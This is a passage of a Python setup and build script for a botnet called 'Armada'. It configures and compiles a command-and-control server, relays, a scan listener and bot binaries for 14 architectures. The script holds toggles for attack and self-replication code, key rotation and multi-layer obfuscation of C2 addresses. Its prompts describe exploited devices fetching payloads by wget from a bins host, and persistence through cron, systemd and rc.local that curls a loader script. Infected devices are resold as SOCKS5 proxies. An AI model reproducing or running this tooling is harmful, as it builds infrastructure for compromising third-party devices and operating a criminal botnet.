    """Find the Go binary, preferring /usr/local/go/bin/go over system PATH"""
    candidates = ["/usr/local/go/bin/go", shutil.which("go")]
    for go in candidates:
        if go and os.path.isfile(go):
            try:
                result = subprocess.run(
                    [go, "version"], capture_output=True, text=True
                )
                if result.returncode == 0:
                    return go
            except Exception:
                continue
    return "go"  # fallback


def build_cnc(cnc_path: str) -> bool:
    """Build the CNC server"""
    try:
        go = find_go()
        info(f"Building CNC server... ({go})")
        result = subprocess.run(
            [go, "build", "-ldflags=-s -w", "-o", "cnc", "."],
            cwd=cnc_path,
            capture_output=True,
            text=True,
        )

        if result.returncode != 0:
            error(f"Build failed: {result.stderr}")
            return False

        # Copy binary to main directory as 'server'
        base_path = os.path.dirname(cnc_path)
        src = os.path.join(cnc_path, "cnc")
        dst = os.path.join(base_path, "server")
        shutil.copy2(src, dst)
        info(f"Copied CNC binary to {dst}")

        return True
    except FileNotFoundError:
        error("Go not found. Please install Go 1.24+")
        return False


def update_relay_config(base_path: str, magic_code: str, relay_config: dict = None):
    """Update the relay server's baked-in config (auth key, ports, report URL, name)"""
    relay_main = os.path.join(base_path, "cnc", "relay", "main.go")
    if not os.path.exists(relay_main):
        warning("cnc/relay/main.go not found, skipping relay config")
        return

    with open(relay_main, "r") as f:
        content = f.read()

    cfg = relay_config or {}

    content = re.sub(
        r'var defaultAuthKey\s*=\s*"[^"]*"',
        f'var defaultAuthKey = "{magic_code}"',
        content,
    )
    cp = cfg.get("control_port", "9001")
    content = re.sub(
        r'var defaultControlPort\s*=\s*"[^"]*"',
        f'var defaultControlPort = "{cp}"',
        content,
    )
    sp = cfg.get("socks_port", "1080")
    content = re.sub(
        r'var defaultSocksPort\s*=\s*"[^"]*"',
        f'var defaultSocksPort = "{sp}"',
        content,
    )
    stats = cfg.get("stats_addr", "")
    content = re.sub(
        r'var defaultStatsAddr\s*=\s*"[^"]*"',
        f'var defaultStatsAddr = "{stats}"',
        content,
    )
    report = cfg.get("report_url", "")
    obf = xor_encode_with_key(report, magic_code) if report else ""
    content = re.sub(
        r'var defaultReportURLObf\s*=\s*"[^"]*"',
        f'var defaultReportURLObf = "{obf}"',
        content,
    )
    name = cfg.get("relay_name", "")
    content = re.sub(
        r'var defaultRelayName\s*=\s*"[^"]*"',
        f'var defaultRelayName = "{name}"',
        content,
    )

    with open(relay_main, "w") as f:
        f.write(content)


def build_relay(base_path: str) -> bool:
    """Build the proxy relay server"""
    try:
        go = find_go()
        relay_path = os.path.join(base_path, "cnc", "relay")
        if not os.path.isdir(relay_path):
            warning("cnc/relay/ directory not found, skipping")
            return False
        out_dir = os.path.join(base_path, "relay_bins")
        os.makedirs(out_dir, exist_ok=True)
        out_bin = os.path.join(out_dir, "relay_server")
        info(f"Building proxy relay... ({go})")
        result = subprocess.run(
            [go, "build", "-trimpath", "-ldflags=-s -w -buildid=", "-o", out_bin, "."],
            cwd=relay_path,
            capture_output=True,
            text=True,
        )
        if result.returncode != 0:
            error(f"Proxy relay build failed: {result.stderr}")
            return False
        info(f"Proxy relay built -> {out_bin}")
        return True
    except FileNotFoundError:
        error("Go not found. Please install Go 1.24+")
        return False


def build_admin_relay(base_path: str) -> bool:
    """Build the admin telnet relay"""
    try:
        go = find_go()
        relay_path = os.path.join(base_path, "cnc", "admin_relay")
        if not os.path.isdir(relay_path):
            warning("cnc/admin_relay/ directory not found, skipping")
            return False
        out_dir = os.path.join(base_path, "relay_bins")
        os.makedirs(out_dir, exist_ok=True)
        out_bin = os.path.join(out_dir, "admin_relay_bin")
        info(f"Building admin relay... ({go})")
        result = subprocess.run(
            [go, "build", "-ldflags=-s -w", "-o", out_bin, "."],
            cwd=relay_path,
            capture_output=True,
            text=True,
        )
        if result.returncode != 0:
            error(f"Admin relay build failed: {result.stderr}")
            return False
        info(f"Admin relay built -> {out_bin}")
        return True
    except FileNotFoundError:
        error("Go not found. Please install Go 1.24+")
        return False


def build_scan_listener(base_path: str) -> bool:
    """Build the scan listener binary"""
    try:
        go = find_go()
        scan_path = os.path.join(base_path, "scanListen")
        if not os.path.isdir(scan_path):
            warning("scanListen/ directory not found, skipping")
            return False
        out_dir = os.path.join(base_path, "relay_bins")
        os.makedirs(out_dir, exist_ok=True)
        out_bin = os.path.join(out_dir, "scanListen")
        info(f"Building scan listener... ({go})")
        result = subprocess.run(
            [go, "build", "-ldflags=-s -w", "-o", out_bin, "."],
            cwd=scan_path,
            env={**os.environ, "GOFLAGS": ""},
            capture_output=True,
            text=True,
        )
        # Fallback: build from module root with package path
        if result.returncode != 0:
            result = subprocess.run(
                [go, "build", "-ldflags=-s -w", "-o", out_bin, "./scanListen/"],
                cwd=base_path,
                env={**os.environ, "GOFLAGS": ""},
                capture_output=True,
                text=True,
            )
        if result.returncode != 0:
            error(f"Scan listener build failed: {result.stderr}")
            return False
        info(f"Scan listener built -> {out_bin}")
        return True
    except FileNotFoundError:
        error("Go not found. Please install Go 1.24+")
        return False


def is_attack_disabled(base_path: str) -> bool:
    """Returns True if attack code is currently disabled (.noattack marker exists)"""
    marker = os.path.join(base_path, ".noattack")
    return os.path.exists(marker)


def set_attack_mode(base_path: str, disable_attacks: bool):
    """Set or clear the .noattack marker file"""
    marker = os.path.join(base_path, ".noattack")
    if disable_attacks:
        with open(marker, "w") as f:
            f.write("# Attack code disabled - proxy-only build\n")
    else:
        if os.path.exists(marker):
            os.remove(marker)


def is_selfrep_disabled(base_path: str) -> bool:
    """Returns True if selfrep code is currently disabled (.noselfrep marker exists)"""
    marker = os.path.join(base_path, ".noselfrep")
    return os.path.exists(marker)


def set_selfrep_mode(base_path: str, disable_selfrep: bool):
    """Set or clear the .noselfrep marker file"""
    marker = os.path.join(base_path, ".noselfrep")
    if disable_selfrep:
        with open(marker, "w") as f:
            f.write("# Self-replication code disabled - no scanner/exploit build\n")
    else:
        if os.path.exists(marker):
            os.remove(marker)


def build_bots(base_path: str) -> bool:
    """Build proxy binaries using tools/build.sh from project root"""
    try:
        build_script = os.path.join(base_path, "tools", "build.sh")

        # Make build.sh executable
        os.chmod(build_script, 0o755)

        # Check attack mode
        no_attack = is_attack_disabled(base_path)
        env = os.environ.copy()
        if no_attack:
            env["NO_ATTACK"] = "1"
            info("Building proxy binaries (PROXY ONLY — no attack code)...")
        else:
            env.pop("NO_ATTACK", None)

        # Check selfrep mode
        no_selfrep = is_selfrep_disabled(base_path)
        if no_selfrep:
            env["NO_SELFREP"] = "1"
            info("Building without self-replication (no scanner/exploit code)...")
        else:
            env.pop("NO_SELFREP", None)
            info("Building proxy binaries for 14 architectures...")
        info("This may take a few minutes...")
        print()

        result = subprocess.run(["bash", build_script], cwd=base_path, text=True, env=env)

        return result.returncode == 0
    except Exception as e:
        error(f"Build failed: {e}")
        return False




def save_config(base_path: str, config: dict):
    """Save configuration to a file for reference"""
    config_path = os.path.join(base_path, "setup_config.txt")

    with open(os.open(config_path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600), "w") as f:
        f.write("=" * 60 + "\n")
        f.write("Armada Configuration\n")
        f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write("=" * 60 + "\n\n")

        f.write("[Proxy Server]\n")
        c2_addrs = config.get("c2_addresses", [config.get("c2_address", "N/A")])
        for i, addr in enumerate(c2_addrs):
            if i == 0:
                f.write(f"Bot C2 Address: {addr}\n")
            else:
                f.write(f"  Backup C2 #{i}: {addr}\n")
        f.write(f"Admin Port: {config['admin_port']}\n")
        c2_ports = config.get("c2_ports", ["443"])
        f.write(f"Bot Ports: {', '.join(c2_ports)}\n")
        scan_srv = config.get("scan_server", "")
        if scan_srv:
            f.write(f"Scan Server: {scan_srv}\n")
        f.write("\n")

        f.write("[Security]\n")
        f.write(f"Magic Code: {config['magic_code']}\n")
        f.write(f"Protocol Version: {config['protocol_version']}\n")
        f.write(f"Crypt Seed: {config['crypt_seed']}\n")
        f.write(f"Obfuscated Address: {config['obfuscated_c2']}\n")
        if config.get("proxy_user"):
            f.write(f"Proxy User: {config['proxy_user']}\n")
            f.write(f"Proxy Pass: {config.get('proxy_pass', '')}\n")
        f.write("\n")

        f.write("[Relay Server]\n")
        f.write(f"Auth Key: {config['magic_code']}\n")
        relay_cfg = config.get("relay_config", {})
        f.write(f"Control Port: {relay_cfg.get('control_port', '9001')}\n")
        f.write(f"SOCKS Port: {relay_cfg.get('socks_port', '1080')}\n")
        report_url = relay_cfg.get("report_url", "")
        if report_url:
            f.write(f"Report URL: {report_url}\n")
        relay_name = relay_cfg.get("relay_name", "")
        if relay_name:
            f.write(f"Relay Name: {relay_name}\n")
        f.write(f"Binary: relay_bins/relay_server\n")
        f.write(f"Start: ./relay_server -key {config['magic_code']} -cp {relay_cfg.get('control_port', '9001')} -sp {relay_cfg.get('socks_port', '1080')}\n")
        f.write("\n")

        f.write("[Usage]\n")
        f.write("1. Start CNC (TUI mode):   ./server\n")
        f.write("2. Start CNC (split mode): ./server --split\n")
        f.write(
            f"3. Connect Admin (split mode): nc {config.get('c2_addresses', [config.get('c2_address', 'localhost:443')])[0].split(':')[0]} {config['admin_port']}\n"
        )
        f.write("4. Login trigger (split mode): spamtec\n")
        f.write("5. Proxy binaries: bins/\n")
        f.write(f"6. Start Relay: ./relay_server -key {config['magic_code']}\n")
        scan_srv = config.get("scan_server", "")
        if scan_srv:
            scan_port = scan_srv.split(":")[-1] if ":" in scan_srv else "48290"
            f.write(f"7. Start Scan Listener: ./relay_bins/scanListen -p {scan_port}\n")
        f.write("\n")
        f.write("[Modes]\n")
        f.write(
            "TUI Mode (default): Local interactive terminal UI, no telnet server needed\n"
        )
        f.write(
            "Split Mode (--split): Starts telnet admin server for multi-user remote access\n"
        )

    return config_path


def print_summary(config: dict):
    """Print final setup summary with all configuration details"""
    print(f"\n{Colors.BRIGHT_GREEN}{'═' * 60}{Colors.RESET}")
    print(f"{Colors.BRIGHT_GREEN}{Colors.BOLD}  ✓ SETUP COMPLETE!{Colors.RESET}")
    print(f"{Colors.BRIGHT_GREEN}{'═' * 60}{Colors.RESET}\n")

    c2_addrs = config.get("c2_addresses", [config.get("c2_address", "N/A")])
    if len(c2_addrs) == 1:
        print(
            f"  {Colors.YELLOW}Server Address:{Colors.RESET}  {Colors.BRIGHT_WHITE}{c2_addrs[0]}{Colors.RESET}"
        )
    else:
        print(
            f"  {Colors.YELLOW}C2 Pool:{Colors.RESET}         {Colors.BRIGHT_WHITE}{c2_addrs[0]}{Colors.RESET} (primary)"
        )
        for addr in c2_addrs[1:]:
            print(
                f"                    {Colors.BRIGHT_WHITE}{addr}{Colors.RESET}"
            )
    print(
        f"  {Colors.YELLOW}Admin Port:{Colors.RESET}      {Colors.BRIGHT_WHITE}{config.get('admin_port', 'N/A')}{Colors.RESET}"
    )
    print(
        f"  {Colors.YELLOW}Magic Code:{Colors.RESET}      {Colors.BRIGHT_WHITE}{config.get('magic_code', 'N/A')}{Colors.RESET}"
    )
    print(
        f"  {Colors.YELLOW}Protocol:{Colors.RESET}        {Colors.BRIGHT_WHITE}{config.get('protocol_version', 'N/A')}{Colors.RESET}"
    )
    proxy_u = config.get("proxy_user", "vision")
    proxy_p = config.get("proxy_pass", "vision")
    print(
        f"  {Colors.YELLOW}Proxy Auth:{Colors.RESET}      {Colors.BRIGHT_WHITE}{proxy_u}:{proxy_p}{Colors.RESET}"
    )
    print()

    print(f"{Colors.BRIGHT_CYAN}  Quick Start:{Colors.RESET}")
    print(
        f"    TUI Mode:     {Colors.GREEN}./server{Colors.RESET}           (local interactive UI)"
    )
    print(
        f"    Split Mode:   {Colors.GREEN}./server --split{Colors.RESET}   (multi-user telnet)"
    )
    c2_ip = config.get("c2_address", "localhost:443").split(":")[0]
    admin_port = config.get("admin_port", "420")
    print(
        f"    Admin Login:  {Colors.GREEN}nc {c2_ip} {admin_port}{Colors.RESET}  (split mode only)"
    )
    print(
        f"    Login Trigger:{Colors.GREEN} spamtec{Colors.RESET}            (split mode only)"
    )
    print(f"    Proxy bins:   {Colors.GREEN}bins/{Colors.RESET}")
    print()


def get_current_config(bot_path: str, cnc_path: str) -> dict:
    """Extract current configuration from source files"""
    config = {}

    # Read bot config
    bot_hpp = os.path.join(bot_path, "headers", "bot.h")
    if os.path.exists(bot_hpp):
        with open(bot_hpp, "r") as f:
            content = f.read()

            match = re.search(r'#define\s+SYNC_TOKEN\s+"([^"]*)"', content)
            if match:
                config["magic_code"] = match.group(1)

            match = re.search(r'#define\s+BUILD_TAG\s+"([^"]*)"', content)
            if match:
                config["protocol_version"] = match.group(1)

            match = re.search(r'#define\s+CONFIG_SEED\s+"([^"]*)"', content)
            if match:
                config["crypt_seed"] = match.group(1)

    # Read cnc/main.go for admin port
    cnc_main = os.path.join(cnc_path, "main.go")
    if os.path.exists(cnc_main):
        with open(cnc_main, "r") as f:
            content = f.read()

            match = re.search(r'USER_SERVER_PORT\s*=\s*"([^"]*)"', content)
            if match:
                config["admin_port"] = match.group(1)

            match = re.search(r'BOT_SERVER_PORTS?\s*=\s*"([^"]*)"', content)
            if match:
                config["c2_ports"] = [p.strip() for p in match.group(1).split(",") if p.strip()]

    return config


def load_config_file(base_path: str) -> dict:
    """Parse setup_config.txt and return a config dict"""
    config_path = os.path.join(base_path, "setup_config.txt")
    if not os.path.exists(config_path):
        return {}

    config = {}
    with open(config_path, "r") as f:
        content = f.read()

    # [Proxy Server]
    m = re.search(r'Bot C2 Address:\s*(.+)', content)
    if m:
        raw = m.group(1).strip()
        # Could be "host:port1,port2" or "host"
        config["c2_address"] = raw
        # Parse into addresses list
        if ":" in raw:
            parts = raw.split(":")
            host = parts[0]
            ports = [p.strip() for p in parts[1].split(",") if p.strip()]
            config["c2_addresses"] = [f"{host}:{','.join(ports)}"]
            config["c2_ports"] = ports
        else:
            config["c2_addresses"] = [raw]

    # Backup C2 addresses
    for bm in re.finditer(r'Backup C2 #\d+:\s*(.+)', content):
        addr = bm.group(1).strip()
        if "c2_addresses" not in config:
            config["c2_addresses"] = []
        config["c2_addresses"].append(addr)

    m = re.search(r'Admin Port:\s*(\S+)', content)
    if m:
        config["admin_port"] = m.group(1).strip()

    m = re.search(r'Bot Ports:\s*(.+)', content)
    if m:
        config["c2_ports"] = [p.strip() for p in m.group(1).split(",") if p.strip()]

    # [Security]
    m = re.search(r'Magic Code:\s*(\S+)', content)
    if m:
        config["magic_code"] = m.group(1).strip()

    m = re.search(r'Protocol Version:\s*(\S+)', content)
    if m:
        config["protocol_version"] = m.group(1).strip()

    m = re.search(r'Crypt Seed:\s*(\S+)', content)
    if m:
        config["crypt_seed"] = m.group(1).strip()

    m = re.search(r'Obfuscated Address:\s*(\S+)', content)
    if m:
        config["obfuscated_c2"] = m.group(1).strip()

    m = re.search(r'Scan Server:\s*(\S+)', content)
    if m:
        config["scan_server"] = m.group(1).strip()

    m = re.search(r'Proxy User:\s*(\S+)', content)
    if m:
        config["proxy_user"] = m.group(1).strip()

    m = re.search(r'Proxy Pass:\s*(\S+)', content)
    if m:
        config["proxy_pass"] = m.group(1).strip()

    # [Relay Server]
    relay_cfg = {}
    m = re.search(r'\[Relay Server\].*?Control Port:\s*(\S+)', content, re.DOTALL)
    if m:
        relay_cfg["control_port"] = m.group(1).strip()
    m = re.search(r'\[Relay Server\].*?SOCKS Port:\s*(\S+)', content, re.DOTALL)
    if m:
        relay_cfg["socks_port"] = m.group(1).strip()
    m = re.search(r'Report URL:\s*(\S+)', content)
    if m:
        relay_cfg["report_url"] = m.group(1).strip()
    m = re.search(r'Relay Name:\s*(\S+)', content)
    if m:
        relay_cfg["relay_name"] = m.group(1).strip()
    if relay_cfg:
        config["relay_config"] = relay_cfg

    return config


def print_menu():
    """Print the main menu"""
    print(
        f"\n{Colors.BRIGHT_CYAN}╔══════════════════════════════════════════════════════════════╗{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}                 {Colors.BRIGHT_YELLOW}Select Setup Mode{Colors.RESET}                          {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}╠══════════════════════════════════════════════════════════════╣{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}                                                              {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}  {Colors.BRIGHT_GREEN}[1]{Colors.RESET} {Colors.BRIGHT_WHITE}Full Setup{Colors.RESET}                                           {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.GREEN}├─{Colors.RESET} New server address (IP or domain)                 {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.GREEN}├─{Colors.RESET} Generate new magic code & protocol version        {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.GREEN}└─{Colors.RESET} Build CNC server & proxy binaries                 {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.DIM}Best for: Fresh install, new campaign{Colors.RESET}                {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}                                                              {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}  {Colors.BRIGHT_YELLOW}[2]{Colors.RESET} {Colors.BRIGHT_WHITE}Server URL Update Only{Colors.RESET}                                {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.YELLOW}├─{Colors.RESET} Change server domain or IP address                {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.YELLOW}├─{Colors.RESET} Keep existing magic code                          {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.YELLOW}└─{Colors.RESET} Rebuild proxy binaries only                       {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.DIM}Best for: Server migration, domain change{Colors.RESET}            {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}                                                              {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}  {Colors.BRIGHT_MAGENTA}[3]{Colors.RESET} {Colors.BRIGHT_WHITE}Rebuild Only{Colors.RESET}                                         {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.MAGENTA}├─{Colors.RESET} Toggle attack code on/off                          {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.MAGENTA}└─{Colors.RESET} Rebuild binaries with current config                {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.DIM}Best for: Switching between proxy-only & full builds{Colors.RESET} {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}                                                              {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}  {Colors.BRIGHT_BLUE}[4]{Colors.RESET} {Colors.BRIGHT_WHITE}Import Config & Rebuild{Colors.RESET}                               {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.BLUE}├─{Colors.RESET} Load tokens/magic from setup_config.txt            {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.BLUE}└─{Colors.RESET} Apply to source and rebuild everything              {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.DIM}Best for: Config mismatch, restoring from backup{Colors.RESET}      {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}                                                              {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}  {Colors.BRIGHT_RED}[0]{Colors.RESET} Exit                                                  {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}                                                              {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}╚══════════════════════════════════════════════════════════════╝{Colors.RESET}"
    )

    # Print quick feature summary
    print(
        f"\n{Colors.DIM}  📡 Supports: Direct IP, Domain (A record), or TXT record resolution{Colors.RESET}"
    )
    print(f"{Colors.DIM}  🔒 Proxy→Server encrypted via VPE2 (ChaCha20 + X25519 + HMAC) on port 443{Colors.RESET}")
    print(
        f"{Colors.DIM}  🏗️  Builds for 14 architectures (x86, ARM, MIPS, etc.){Colors.RESET}\n"
    )

    choice = prompt("Select option", "1")
    return choice


def run_full_setup(base_path: str, cnc_path: str, bot_path: str):
    """Run full setup - everything new"""
    config = {}

    # Debug Mode Configuration (before main setup)
    debug_enabled = prompt_debug_mode()
    config["debug_mode"] = debug_enabled

    if debug_enabled:
        warning("Debug mode ENABLED - remember to disable for production!")
    else:
        success("Debug mode disabled - ready for production")
    print()

    # Step 1: Server Address
    print_step(1, 5, "Server Configuration")

    print(
        f"{Colors.DIM}   Enter your C2 address — can be an IP or domain.{Colors.RESET}"
    )
    print(
        f"{Colors.DIM}   Examples: 192.168.1.100 | c2.example.com | lookup.mydomain.com{Colors.RESET}"
    )
    print(
        f"{Colors.DIM}   You can add up to 5 addresses. The bot rotates between them on failure.{Colors.RESET}\n"
    )

    c2_ip = prompt("C2 address (IP or domain)")

    print(
        f"\n{Colors.DIM}   Enter one or more ports the C2 should listen on (comma-separated).{Colors.RESET}"
    )
    print(
        f"{Colors.DIM}   The bot will try each port in random order until one connects.{Colors.RESET}\n"
    )
    c2_ports_str = prompt("C2 ports", "443")
    c2_ports = [p.strip() for p in c2_ports_str.split(",") if p.strip()]
    if not c2_ports:
        c2_ports = ["443"]
    config["c2_ports"] = c2_ports

    c2_addresses = [f"{c2_ip}:{','.join(c2_ports)}"]

    for i in range(4):  # Up to 4 more addresses
        extra = prompt(f"Add another C2 address? (empty to skip)", "")
        if not extra.strip():
            break
        c2_addresses.append(f"{extra.strip()}:{','.join(c2_ports)}")

    config["c2_addresses"] = c2_addresses
    # Backwards compat: keep c2_address as first entry
    config["c2_address"] = c2_addresses[0]

    admin_port = prompt("What port would you like for admin CLI?", "420")
    config["admin_port"] = admin_port

    print()
    if len(c2_ports) > 1:
        success(f"C2 Ports: {', '.join(c2_ports)}")
    if len(c2_addresses) == 1:
        success(f"Bot C2: {c2_addresses[0]} | Admin port: {admin_port}")
    else:
        success(f"Bot C2 Pool: {', '.join(c2_addresses)} | Admin port: {admin_port}")

    # Default SOCKS5 proxy credentials
    print(
        f"\n{Colors.DIM}   Default credentials for SOCKS5 proxy access.{Colors.RESET}"
    )
    print(
        f"{Colors.DIM}   Users connect with: bot_ip:port:username:password{Colors.RESET}"
    )
    print(
        f"{Colors.DIM}   Can be changed at runtime via !socksauth command.{Colors.RESET}\n"
    )
    proxy_user = prompt("Default proxy username", "vision")
    proxy_pass = prompt("Default proxy password", "vision")
    config["proxy_user"] = proxy_user
    config["proxy_pass"] = proxy_pass
    success(f"Proxy auth: {proxy_user}:{proxy_pass}")

    # Bins server — hosts exploit payloads that scanners download to targets
    print(
        f"\n{Colors.DIM}   The bins server hosts compiled bot binaries for each architecture.{Colors.RESET}"
    )
    print(
        f"{Colors.DIM}   Scanners instruct exploited devices to wget from this host.{Colors.RESET}"
    )
    print(
        f"{Colors.DIM}   TIP: Use a domain (e.g. bins.example.com) instead of an IP — if the{Colors.RESET}"
    )
    print(
        f"{Colors.DIM}   server changes, update DNS instead of pushing !updatefetch to every bot.{Colors.RESET}\n"
    )
    bins_host = prompt("Bins server host (IP or domain)", c2_ip)
    config["bins_host"] = bins_host

    # Fetch URL — the loader script that persistence mechanisms re-download
    default_fetch = f"http://{bins_host}/init.sh"
    print(
        f"\n{Colors.DIM}   The fetch URL is the loader script bots use for reinstall/persistence.{Colors.RESET}"
    )
    print(
        f"{Colors.DIM}   Persistence mechanisms (systemd, cron, rc.local) curl this URL.{Colors.RESET}"
    )
    print(
        f"{Colors.DIM}   Can be updated on live bots later with !updatefetch from the web panel.{Colors.RESET}\n"
    )
    fetch_url = prompt("Fetch URL (loader script)", default_fetch)
    config["fetch_url"] = fetch_url
    success(f"Bins host: {bins_host} | Fetch URL: {fetch_url}")

    # Step 2: Security Tokens & Keys
    print_step(2, 5, "Security Token & Key Generation")

    # Read current values from source files so we can offer to keep them
    cpp_crypto_path = os.path.join(bot_path, "crypto.c")
    cpp_config_path = os.path.join(bot_path, "config.c")
    bot_h_path = os.path.join(bot_path, "headers", "bot.h")
    old_aes_key = read_current_key_cpp(cpp_crypto_path)
    old_chacha_key = read_current_chacha_key_cpp(cpp_crypto_path)

    # Try to read current magic/protocol/seed from bot.h
    cur_magic = cur_proto = cur_seed = None
    try:
        with open(bot_h_path, "r") as f:
            bh = f.read()
        m = re.search(r'#define\s+SYNC_TOKEN\s+"([^"]+)"', bh)
        if m: cur_magic = m.group(1)
        m = re.search(r'#define\s+BUILD_TAG\s+"([^"]+)"', bh)
        if m: cur_proto = m.group(1)
        m = re.search(r'#define\s+CONFIG_SEED\s+"([^"]+)"', bh)
        if m: cur_seed = m.group(1)
    except Exception:
        pass

    has_existing = cur_magic and cur_proto and cur_seed and any(b != 0 for b in old_aes_key)

    if has_existing:
        print(f"{Colors.DIM}   Existing security tokens detected in source.{Colors.RESET}")
        print(f"{Colors.DIM}   Keep them to stay compatible with deployed bots/C2.{Colors.RESET}")
        print(f"{Colors.DIM}   Rotate only for a completely fresh deployment.{Colors.RESET}\n")
        keep_keys = confirm("Keep existing security tokens & encryption keys?", default=True)
        if not keep_keys:
            print(f"\n{Colors.BRIGHT_RED}  *** WARNING: ROTATING KEYS WILL BREAK ALL DEPLOYED BOTS ***{Colors.RESET}")
            print(f"{Colors.BRIGHT_RED}  Existing bots cannot decrypt new config or authenticate to new C2.{Colors.RESET}")
            print(f"{Colors.BRIGHT_RED}  Only do this for a completely fresh deployment with zero live bots.{Colors.RESET}\n")
            really_rotate = confirm("Are you SURE you want to rotate all keys?", default=False)
            if not really_rotate:
                keep_keys = True
                success("Key rotation cancelled — keeping existing keys")
    else:
        keep_keys = False

    if keep_keys:
        magic_code = cur_magic
        protocol_version = cur_proto
        crypt_seed = cur_seed
        new_aes_key = old_aes_key
        new_chacha_key = old_chacha_key
        success(f"Magic: {magic_code} (kept)")
        success(f"Protocol: {protocol_version} (kept)")
        success(f"Crypt seed: {crypt_seed} (kept)")
        success(f"Encryption keys: unchanged")
    else:
        magic_code = generate_magic_code(16)
        protocol_version = generate_protocol_version()
        crypt_seed = generate_crypt_seed()
        new_aes_key, _ = generate_random_key()
        new_chacha_key, _ = generate_random_key()
        # Patch bot keys in crypto.c
        patch_cpp_keys(cpp_crypto_path, new_aes_key, new_chacha_key)
        success(f"Magic: {magic_code} (new)")
        success(f"Protocol: {protocol_version} (new)")
        success(f"Crypt seed: {crypt_seed} (new)")
        success(f"AES key randomized ({new_aes_key.hex()[:16]}...)")
        success(f"ChaCha20 key randomized ({new_chacha_key.hex()[:16]}...)")

    config["magic_code"] = magic_code
    config["protocol_version"] = protocol_version
    config["crypt_seed"] = crypt_seed

    # Re-encrypt config blobs only if keys changed
    if not keep_keys:
        encrypt_cpp_config_blobs(cpp_config_path, old_aes_key, new_aes_key, old_chacha_key, new_chacha_key)
        success("Config blobs re-encrypted (dual-layer AES+ChaCha20)")
    else:
        success("Config blobs unchanged (same keys)")

    # Obfuscate C2 pool (now uses the NEW keys via garuda_key() / derive_key_py())
    info("Applying multi-layer obfuscation...")
    obfuscated_parts = []
    for addr in c2_addresses:
        obfuscated_parts.append(obfuscate_c2(addr, crypt_seed))
    obfuscated_c2 = "\x00".join(obfuscated_parts)
    config["obfuscated_c2"] = obfuscated_c2

    # Verify each address individually
    all_verified = True
    for i, addr in enumerate(c2_addresses):
        if not verify_obfuscation(obfuscated_parts[i], crypt_seed, addr):
            all_verified = False
            error(f"Obfuscation verification failed for {addr}!")
    if all_verified:
        success(f"Server address obfuscation verified ({len(c2_addresses)} address(es)) ✓")
    else:
        error("Obfuscation verification failed!")
        sys.exit(1)

    # Step 3: Update Source
    print_step(3, 4, "Updating Source Code")

    print(
        f"{Colors.DIM}   Applying your configuration to source files...{Colors.RESET}\n"
    )

    if update_cnc_main_go(cnc_path, magic_code, protocol_version, admin_port, c2_ports,
                          proxy_user=config.get("proxy_user", "vision"),
                          proxy_pass=config.get("proxy_pass", "vision")):
        success("CNC configured")
    else:
        error("Failed to update CNC")

    if update_bot_config(
        bot_path, magic_code, protocol_version, obfuscated_c2, crypt_seed
    ):
        success("Proxy agent configured")
    else:
        error("Failed to update proxy agent")

    update_dga_predict(base_path, crypt_seed, magic_code, new_aes_key)
